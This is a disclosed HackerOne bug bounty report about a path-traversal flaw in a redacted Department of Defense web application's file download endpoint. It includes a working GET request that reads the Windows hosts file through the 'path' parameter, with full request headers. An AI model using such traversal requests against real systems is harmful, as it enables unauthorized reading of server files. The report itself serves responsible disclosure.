---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1641148'
original_report_id: '1641148'
title: Directory Traversal at █████
weakness: Path Traversal
team_handle: deptofdefense
created_at: '2022-07-18T20:47:02.420Z'
disclosed_at: '2022-09-14T20:27:13.810Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- path-traversal
---

# Directory Traversal at █████

## Metadata

- HackerOne Report ID: 1641148
- Weakness: Path Traversal
- Program: deptofdefense
- Disclosed At: 2022-09-14T20:27:13.810Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi  DoD!

I found directory traversal vulnerability at ████. I didn't find available title for this issue that's why I selected remote file inclusion.

###  Host: ██████
###  Vulnerability: Directory Traversal in Windows Server
###  Tool Used: BurpSuite

### Parameter:  ==path==

###HTTP GET Request###
==GET /File/Download?path=C:/WINDOWS/System32/drivers/etc/hosts==

### Response

███

## Impact

Attacker could read sensitive file in server

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Make HTTP Request like that;

GET /File/Download?path=C:/WINDOWS/System32/drivers/etc/hosts HTTP/1.1
Host: ███
Cookie: .AspNetCore.Antiforgery.GupjSGuR2ZQ=CfDJ8GfYfRi9j8NNoBU6zVTpTKTbaG72CuADzxVVYVr9efssbxXYtgzCMF2H6PvdOcF0RxMExCsaObiVNuop1ouJa2Nb0k3z4KYTy2ih_nRbxREcZZo-3LBJPXq05kvRrRF6p02TakoqGzC6VUTdPRw-bo8; TimeZoneOffset=-240
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

## Suggested Mitigation/Remediation Actions
Input Validation for path parameter

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
